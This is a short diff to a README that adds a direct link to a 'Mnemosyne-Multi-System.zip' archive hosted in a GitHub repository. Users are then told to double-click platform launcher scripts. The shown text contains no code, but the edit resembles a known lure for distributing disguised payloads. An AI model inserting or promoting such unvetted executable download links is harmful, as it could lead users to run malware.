@@ -15,7 +15,7 @@
 
 ## Quick setup
 
-1. Download and extract the Mnemosyne ZIP. Keep the files together in one folder.
+1. [Download Mnemosyne for Windows, macOS, or Linux](https://github.com/glooberslingus/Mnemosyne/blob/main/Mnemosyne-Multi-System.zip), then extract the ZIP. Keep the files together in one folder.
 2. Start the app for your computer:
    - **Windows:** double-click `Start-Windows.bat`.
    - **macOS:** double-click `Start-macOS.command`.
